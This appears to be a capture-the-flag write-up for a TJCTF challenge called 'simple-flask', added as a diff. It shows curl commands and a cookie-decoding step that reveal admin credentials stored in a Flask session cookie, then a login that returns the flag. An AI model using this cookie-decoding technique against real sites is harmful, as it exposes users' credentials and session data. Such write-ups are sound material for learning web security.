@@ -1,0 +1,17 @@
+We notice that it's using flask sessions and after a bit of googling, we realize that flask sessions are stored in cookies. So let's decode the cookie that we get from this website
+
+First we get the cookie:
+> curl --cookie-jar - -D - http://simple-flask.p.tjctf.org -d "username=in/s/ane&password=in/s/ane"
+
+Then, we can decode it using the flask_session_cookie_decoder.py provided, or we can use this website: https://www.kirsle.net/wizards/flask-session.py
+> pip install itsdangerous
+> python flask_session_cookie_decoder.py ".eJyrVkqtKEhNLklNiS9ILC4uzy9KUbKqVlJIUrJSSjGyNE5xzyhINsqpAtI5kblhVSkeThnJxn7GScZe2b5ZjhV-jra2SrU6CFNKi1OL8hJzU-GmRIYHlSSGm4BVIaxQyszTL9ZPzEtV0lFCaEGI1gIAnR4zGQ.CB34-Q.G8Mp0NOBNQWf_IzE6aOXqwedtDk"
+
+From this, we get {u'username': u'in/s/ane', u'expected_password': 'wowthisisthebestpassword2014', u'expected_username': 'admin', u'password': u'in/s/ane'}, which means that the correct credentials are as follows:
+    expected_username: admin
+    expected_password: wowthisisthebestpassword2014
+
+Once we send these correct credentials to the server, we get the flag:
+> curl http://simple-flask.p.tjctf.org -d "username=admin&password=wowthisisthebestpassword2014"
+
+Flag: do_it_right_dont_store_passwords_in_the_session
